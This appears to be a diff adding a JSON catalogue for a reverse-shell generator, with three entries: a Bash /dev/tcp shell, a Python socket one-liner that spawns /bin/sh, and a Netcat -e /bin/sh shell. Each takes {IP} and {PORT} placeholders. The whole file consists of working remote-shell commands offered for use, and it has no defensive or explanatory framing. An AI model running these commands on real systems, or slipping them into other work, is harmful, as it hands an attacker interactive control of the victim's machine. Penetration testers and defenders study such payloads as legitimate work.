@@ -1,0 +1,25 @@
+{
+  "shells": [
+    {
+      "id": "bash_tcp",
+      "name": "Bash TCP",
+      "language": "Bash",
+      "command": "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
+      "description": "A simple Bash TCP reverse shell."
+    },
+    {
+      "id": "python_tcp",
+      "name": "Python TCP",
+      "language": "Python",
+      "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "description": "A Python-based TCP reverse shell."
+    },
+    {
+      "id": "nc_tcp",
+      "name": "Netcat TCP",
+      "language": "Netcat",
+      "command": "nc -e /bin/sh {IP} {PORT}",
+      "description": "A Netcat-based TCP reverse shell."
+    }
+  ]
+}
